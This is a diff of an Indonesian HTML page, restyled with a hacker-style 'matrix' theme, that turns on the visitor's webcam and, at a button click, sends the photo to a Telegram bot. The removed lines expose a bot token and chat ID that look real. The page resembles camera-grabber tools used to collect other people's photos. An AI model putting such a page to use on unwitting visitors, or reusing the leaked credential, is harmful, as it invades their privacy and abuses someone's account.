@@ -1,57 +1,129 @@
-!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Foto Kirim ke Telegram</title>
   <style>
-    body {
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+    body, html {
       margin: 0;
-      background: #121212;
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 0;
+      overflow: hidden;
+      font-family: 'Share Tech Mono', monospace;
+      height: 100vh;
+      color: #00ffcc;
+    }
+
+    canvas#matrix {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       height: 100vh;
       gap: 20px;
+      animation: fadeSlideIn 1.2s ease-out forwards;
     }
+
+    @keyframes fadeSlideIn {
+      0% {
+        opacity: 0;
+        transform: translateY(50px);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
     h1 {
-      color: #00ffcc;
+      font-size: 2rem;
+      text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc;
+      animation: flicker 1.5s infinite alternate;
     }
+
+    @keyframes flicker {
+      0% { opacity: 1; }
+      50% { opacity: 0.7; }
+      100% { opacity: 1; }
+    }
+
     video {
       border: 4px solid #00ffcc;
-      border-radius: 10px;
+      border-radius: 12px;
       width: 320px;
       height: 240px;
       object-fit: cover;
+      box-shadow: 0 0 20px #00ffcc;
     }
+
     button {
-      padding: 12px 24px;
+      padding: 14px 30px;
       font-size: 18px;
       background: #00ffcc;
       color: #000;
       border: none;
-      border-radius: 10px;
+      border-radius: 12px;
       cursor: pointer;
-      transition: background 0.3s ease;
+      transition: all 0.3s ease;
+      box-shadow: 0 0 15px #00ffcc;
     }
-    button:hover {
-      background: #00ccaa;
+
+    button:active {
+      transform: scale(0.95);
+      box-shadow: 0 0 5px #00ffcc;
     }
+
+    .spinner {
+      border: 4px solid #00ffcc;
+      border-top: 4px solid transparent;
+      border-radius: 50%;
+      width: 30px;
+      height: 30px;
+      animation: spin 1s linear infinite;
+      margin-top: -10px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
     #status {
-      font-size: 16px;
-      color: #888;
+      font-size: 14px;
+      color: #ccc;
+      text-shadow: 0 0 5px #00ffcc;
+    }
+
+    canvas#canvas {
+      display: none;
     }
   </style>
 </head>
 <body>
-  <h1>WOI SUKI FOTO DULU!</h1>
-  <video id="video" autoplay playsinline></video>
-  <button id="capture">Ambil Foto & Kirim</button>
-  <p id="status">Menunggu aksi...</p>
-  <canvas id="canvas" style="display: none;"></canvas>
+  <canvas id="matrix"></canvas>
+
+  <div class="container">
+    <h1>EHH ANJG FOTO DULU MEK!</h1>
+    <video id="video" autoplay playsinline></video>
+    <button id="capture">Ambil Foto & Kirim</button>
+    <p id="status">Menunggu aksi...</p>
+    <div id="spinner" class="spinner" style="display: none;"></div>
+    <canvas id="canvas"></canvas>
+    <audio id="shutter" src="https://www.soundjay.com/mechanical/camera-shutter-click-01.mp3" preload="auto"></audio>
+  </div>
 
   <script>
     const video = document.getElementById('video');
@@ -59,8 +131,9 @@
     const ctx = canvas.getContext('2d');
     const captureButton = document.getElementById('capture');
     const statusText = document.getElementById('status');
+    const shutterSound = document.getElementById('shutter');
+    const spinner = document.getElementById('spinner');
 
-    // Akses kamera
     navigator.mediaDevices.getUserMedia({ video: true })
       .then(stream => {
         video.srcObject = stream;
@@ -71,15 +144,14 @@
       });
 
     captureButton.addEventListener('click', () => {
+      shutterSound.play();
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
-
       const imageData = canvas.toDataURL('image/jpeg');
 
-      // Kirim ke Telegram
-      const apiKey = '7163723754:AAEIQk6FGjz2TsS4ELirDfIAbpaOThTAMdU'; // Ganti dengan punyamu
-      const chatId = '6624966395'; // Ganti dengan punyamu
+      const apiKey = 'YOUR_TELEGRAM_BOT_API_KEY';
+      const chatId = 'YOUR_CHAT_ID';
       const url = `https://api.telegram.org/bot${apiKey}/sendPhoto`;
 
       const formData = new FormData();
@@ -87,6 +159,7 @@
       formData.append('photo', dataURLtoBlob(imageData), 'photo.jpg');
 
       statusText.textContent = "Mengirim foto ke Telegram...";
+      spinner.style.display = "block";
 
       fetch(url, {
         method: 'POST',
@@ -95,19 +168,51 @@
       .then(response => response.json())
       .then(data => {
         statusText.textContent = "Foto berhasil dikirim!";
+        spinner.style.display = "none";
       })
       .catch(error => {
         statusText.textContent = "Gagal kirim: " + error;
+        spinner.style.display = "none";
       });
     });
 
-    // Fungsi konversi base64 ke blob
     function dataURLtoBlob(dataurl) {
-      var arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
-          bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
+      const arr = dataurl.split(',');
+      const mime = arr[0].match(/:(.*?);/)[1];
+      const bstr = atob(arr[1]);
+      let n = bstr.length;
+      const u8arr = new Uint8Array(n);
       while(n--) u8arr[n] = bstr.charCodeAt(n);
-      return new Blob([u8arr], {type:mime});
+      return new Blob([u8arr], {type: mime});
     }
+
+    // MATRIX RAIN BACKGROUND
+    const matrix = document.getElementById('matrix');
+    const ctxMatrix = matrix.getContext('2d');
+
+    matrix.width = window.innerWidth;
+    matrix.height = window.innerHeight;
+
+    const chars = "01";
+    const fontSize = 16;
+    const columns = matrix.width / fontSize;
+    const drops = Array(Math.floor(columns)).fill(1);
+
+    function drawMatrix() {
+      ctxMatrix.fillStyle = "rgba(0, 0, 0, 0.05)";
+      ctxMatrix.fillRect(0, 0, matrix.width, matrix.height);
+      ctxMatrix.fillStyle = "#00ffcc";
+      ctxMatrix.font = fontSize + "px monospace";
+
+      for (let i = 0; i < drops.length; i++) {
+        const text = chars[Math.floor(Math.random() * chars.length)];
+        ctxMatrix.fillText(text, i * fontSize, drops[i] * fontSize);
+        if (drops[i] * fontSize > matrix.height && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    }
+
+    setInterval(drawMatrix, 33);
   </script>
 </body>
 </html>
